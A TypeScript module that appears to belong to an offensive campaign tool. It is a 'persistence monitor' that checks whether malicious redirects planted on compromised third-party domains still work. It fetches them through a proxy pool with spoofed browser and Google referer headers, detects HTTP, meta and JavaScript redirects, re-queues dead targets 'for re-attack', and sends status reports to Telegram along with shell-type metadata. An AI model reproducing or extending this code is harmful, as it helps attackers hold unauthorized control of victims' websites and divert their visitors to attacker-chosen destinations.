/**
 * Persistence Monitor — Re-deploy daemon
 * 
 * Monitors deployed redirects and re-deploys them if they go down.
 * Runs as a background agent checking all "success" targets periodically.
 * 
 * Flow:
 * 1. Query all targets with status "success" from serpDiscoveredTargets
 * 2. For each, verify the deployed redirect still works
 * 3. If redirect is down, queue for re-attack
 * 4. Track uptime stats per domain
 */

import { getDb } from "./db";
import { serpDiscoveredTargets } from "../drizzle/schema";
import { eq, and, sql, isNotNull, desc, inArray } from "drizzle-orm";
import { sendTelegramNotification } from "./telegram-notifier";
import { fetchWithPoolProxy } from "./proxy-pool";

// ─── Types ───

export interface PersistenceCheckResult {
  domain: string;
  deployedUrl: string;
  redirectUrl: string;
  isAlive: boolean;
  httpStatus: number;
  redirectWorks: boolean;
  redirectDestination: string | null;
  checkedAt: number;
  error?: string;
}

export interface PersistenceReport {
  totalChecked: number;
  alive: number;
  dead: number;
  requeuedForAttack: number;
  results: PersistenceCheckResult[];
  duration: number;
}

// ─── Core Functions ───

/**
 * Check if a deployed redirect is still alive and working
 */
export async function checkDeployedRedirect(
  deployedUrl: string,
  expectedRedirectUrl: string,
): Promise<PersistenceCheckResult> {
  const domain = deployedUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
  const result: PersistenceCheckResult = {
    domain,
    deployedUrl,
    redirectUrl: expectedRedirectUrl,
    isAlive: false,
    httpStatus: 0,
    redirectWorks: false,
    redirectDestination: null,
    checkedAt: Date.now(),
  };

  try {
    // Step 1: Check if URL is accessible
    const { response: resp } = await fetchWithPoolProxy(deployedUrl, {
      method: "GET",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Referer": "https://www.google.com/",
      },
      redirect: "manual",
    }, { timeout: 15000, fallbackDirect: true });

    result.httpStatus = resp.status;

    // HTTP redirect (301/302/303/307/308)
    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      result.isAlive = true;
      result.redirectWorks = true;
      result.redirectDestination = resp.headers.get("location");
      return result;
    }

    // 200 OK — check for JS/meta redirect
    if (resp.status === 200) {
      result.isAlive = true;
      const text = await resp.text();

      // Meta refresh
      const metaMatch = text.match(/content=["']\d+;\s*url=([^"']+)/i);
      if (metaMatch) {
        result.redirectWorks = true;
        result.redirectDestination = metaMatch[1];
        return result;
      }

      // JS redirect
      const jsPatterns = [
        /location\.replace\(["']([^"']+)/i,
        /location\.href\s*=\s*["']([^"']+)/i,
        /window\.location\s*=\s*["']([^"']+)/i,
        /window\.location\.href\s*=\s*["']([^"']+)/i,
      ];
      for (const pattern of jsPatterns) {
        const jsMatch = text.match(pattern);
        if (jsMatch) {
          result.redirectWorks = true;
          result.redirectDestination = jsMatch[1];
          return result;
        }
      }

      // Check if redirect URL is in the body at all
      const normalizedExpected = expectedRedirectUrl.replace(/^https?:\/\//, "").replace(/\/+$/, "");
      if (text.includes(normalizedExpected)) {
        result.redirectWorks = true;
        result.redirectDestination = expectedRedirectUrl;
        return result;
      }
    }

    // 403/404/500 — file removed or blocked
    if (resp.status >= 400) {
      result.httpStatus = resp.status;
      result.isAlive = false;
      result.error = `HTTP ${resp.status}`;
    }
  } catch (error: any) {
    result.error = error.message;
  }

  return result;
}

/**
 * Run a full persistence check on all successful deployments
 */
export async function runPersistenceCheck(): Promise<PersistenceReport> {
  const startTime = Date.now();
  const report: PersistenceReport = {
    totalChecked: 0,
    alive: 0,
    dead: 0,
    requeuedForAttack: 0,
    results: [],
    duration: 0,
  };

  try {
    const db = await getDb();
    if (!db) {
      report.duration = Date.now() - startTime;
      return report;
    }

    // Get all targets with status "success" that have deployed URLs
    const successTargets = await db
      .select()
      .from(serpDiscoveredTargets)
      .where(
        and(
          eq(serpDiscoveredTargets.status, "success"),
          isNotNull(serpDiscoveredTargets.deployedUrls),
        )
      )
      .orderBy(desc(serpDiscoveredTargets.updatedAt))
      .limit(50); // Check up to 50 per run

    report.totalChecked = successTargets.length;

    // Check each target in parallel (max 5 concurrent)
    const CONCURRENCY = 5;
    for (let i = 0; i < successTargets.length; i += CONCURRENCY) {
      const batch = successTargets.slice(i, i + CONCURRENCY);
      const results = await Promise.allSettled(
        batch.map(async (target) => {
          // Use first deployed URL from the JSON array
          const urls = target.deployedUrls || [];
          const deployedUrl = urls[0] || `https://${target.domain}/`;
          const redirectUrl = target.attackResult || "";
          return checkDeployedRedirect(deployedUrl, redirectUrl);
        })
      );

      for (let j = 0; j < results.length; j++) {
        const result = results[j];
        const target = batch[j];

        if (result.status === "fulfilled") {
          const check = result.value;
          report.results.push(check);

          if (check.isAlive && check.redirectWorks) {
            report.alive++;
            // Update updatedAt (auto-updated by schema)
            await db
              .update(serpDiscoveredTargets)
              .set({ updatedAt: new Date() })
              .where(eq(serpDiscoveredTargets.id, target.id))
              .catch(() => {});
          } else {
            report.dead++;
            // Re-queue for attack
            await db
              .update(serpDiscoveredTargets)
              .set({
                status: "queued",
                attackResult: `persistence_dead:${check.error || 'redirect_broken'}`,
              })
              .where(eq(serpDiscoveredTargets.id, target.id))
              .catch(() => {});
            report.requeuedForAttack++;
          }
        } else {
          report.dead++;
          // Re-queue on error
          await db
            .update(serpDiscoveredTargets)
            .set({
              status: "queued",
              attackResult: "persistence_check_error",
            })
            .where(eq(serpDiscoveredTargets.id, target.id))
            .catch(() => {});
          report.requeuedForAttack++;
        }
      }
    }

    // Send Telegram notification
    if (report.totalChecked > 0) {
      const deadDomains = report.results
        .filter(r => !r.isAlive || !r.redirectWorks)
        .map(r => r.domain)
        .slice(0, 10);

      await sendTelegramNotification({
        type: report.dead > 0 ? "info" : "success",
        targetUrl: "persistence-monitor",
        redirectUrl: "",
        deployedUrls: [],
        shellType: "monitor",
        duration: Date.now() - startTime,
        errors: [],
        details: [
          `🔍 Persistence Check Report`,
          `📊 Checked: ${report.totalChecked} | ✅ Alive: ${report.alive} | ❌ Dead: ${report.dead}`,
          `🔄 Re-queued for attack: ${report.requeuedForAttack}`,
          report.dead > 0 ? `💀 Dead domains: ${deadDomains.join(", ")}` : `✅ All deployments healthy!`,
          `⏱️ Duration: ${Math.round((Date.now() - startTime) / 1000)}s`,
        ].join("\n"),
      }).catch(() => {});
    }
  } catch (error: any) {
    // Best effort
  }

  report.duration = Date.now() - startTime;
  return report;
}

/**
 * Get persistence stats
 */
export async function getPersistenceStats(): Promise<{
  totalSuccess: number;
  totalAlive: number;
  totalDead: number;
  lastCheckAt: number | null;
  uptimeRate: number;
}> {
  try {
    const db = await getDb();
    if (!db) return { totalSuccess: 0, totalAlive: 0, totalDead: 0, lastCheckAt: null, uptimeRate: 0 };

    const [successCount] = await db
      .select({ count: sql<number>`COUNT(*)` })
      .from(serpDiscoveredTargets)
      .where(eq(serpDiscoveredTargets.status, "success"));

    const [queuedFromSuccess] = await db
      .select({ count: sql<number>`COUNT(*)` })
      .from(serpDiscoveredTargets)
      .where(
        and(
          eq(serpDiscoveredTargets.status, "queued"),
          sql`${serpDiscoveredTargets.attackResult} LIKE 'persistence_%'`,
        )
      );

    const totalSuccess = Number(successCount?.count || 0);
    const totalDead = Number(queuedFromSuccess?.count || 0);
    const totalAlive = totalSuccess;
    const uptimeRate = totalSuccess + totalDead > 0
      ? (totalAlive / (totalSuccess + totalDead)) * 100
      : 0;

    return {
      totalSuccess,
      totalAlive,
      totalDead,
      lastCheckAt: Date.now(),
      uptimeRate: Math.round(uptimeRate * 10) / 10,
    };
  } catch {
    return { totalSuccess: 0, totalAlive: 0, totalDead: 0, lastCheckAt: null, uptimeRate: 0 };
  }
}
